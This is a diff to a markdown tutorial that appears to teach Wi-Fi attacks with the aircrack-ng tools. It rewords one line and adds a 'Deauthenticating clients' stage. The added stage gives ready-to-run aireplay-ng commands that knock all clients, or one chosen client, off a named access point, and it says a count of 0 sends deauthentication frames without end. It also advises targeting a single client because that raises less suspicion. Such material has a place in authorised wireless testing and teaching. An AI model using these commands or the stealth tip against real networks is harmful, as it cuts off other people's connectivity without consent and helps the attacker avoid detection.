@@ -65,7 +65,7 @@ Enables your wireless interface.
 ```
 airmon-ng check kill
 ```
-All processes or services that control wireless interfaces will be killed to prevent interference.
+All processes or services that control wireless interfaces will be stopped to prevent interference.
 ```
 sudo airmon-ng start wlan0
 ```
@@ -124,3 +124,20 @@ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probe
                                                                                                                
 28:C0:1B:20:05:6B DC:80:84:67:84:4A  -36    6e-24      0      162                                              
 ```
+If you are planning on deauthenticating clients from a target access point, leave this terminal running in the background and open a new terminal.
+
+## Stage 5 - Deauthenticating clients
+
+If you wish to deauthenticate all clients from an access point
+
+```
+sudo aireplay-ng --deauth 100 -a 28:C0:1B:20:05:6B wlan0mon
+```
+
+Deauthenticating one client from an access point is a lot less noisy and does not raise as much suspicion.
+
+```
+sudo aireplay-ng --deauth 100 -a 28:C0:1B:20:05:6B -c DC:80:84:67:84:4A wlan0mon
+```
+
+You can change the value for the `--deauth` flag to send more or less deauthentication frames, a value of 0 will continuously send deauthentication packets until the process is stopped.
